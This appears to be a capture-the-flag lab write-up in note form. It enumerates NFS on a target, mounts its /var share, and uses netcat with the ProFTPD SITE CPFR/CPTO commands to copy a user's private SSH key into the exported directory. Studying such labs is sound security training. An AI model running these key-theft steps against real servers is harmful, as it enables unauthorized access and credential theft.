---
tags:
  - "#networking"
  - "#security"
  - "#post-exploitation"
  - "#red-teaming"
  - "#bug-bounty"
  - "#nfs-enumeration"
  - "#ftp-commands"
  - "#security-testing"
---
# Scanning `rpcbind` on the Network
To scan for `rpcbind` on a network and check NFS shares, use the following command:

```bash
sudo nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP  # Scanning port 111 for rpcbind and list NFS shares
```

### Listing Mounted Partitions on the Network
To list the mounted partitions of a network system, use:

```bash
showmount -e $IP  # List the exported directories on the NFS server
```

---

# Mounting `rpcbind` Directories on Local Machine

To mount a remote NFS directory on local machine. In this example, the directory `/var` is mounted from the remote server with IP `10.10.122.178`.

```bash
mkdir /mnt/kenobiNFS  # Creating a `/mnt/kenobiNFS` directory to mount the NFS share
sudo mount 10.10.122.178:/var /mnt/kenobiNFS  # Mount `/var` from remote server to local machine at `/mnt/kenobiNFS`
ls -la /mnt/kenobiNFS  # Show contents of the mounted /var directory
```

# Using `netcat` to Connect to FTP Service

To test the FTP connection on a remote machine, you can use `nc` (Netcat). In this example, we are connecting to FTP on IP `10.10.15.180`:

```bash
nc $IP 21  # Connect to FTP service on port 21
# Non-Interactive shell: execute these following command
# output: 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.15.180]
SITE CPFR /home/kenobi/.ssh/id_rsa
# output: 350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
# output: 250 Copy successful  # Successful file transfer from /home/kenobi/.ssh/id_rsa to /var/tmp/id_rsa
```

This FTP session shows a successful transfer of a file from `/home/kenobi/.ssh/id_rsa` to `/var/tmp/id_rsa` using the `SITE CPFR` and `SITE CPTO` commands.
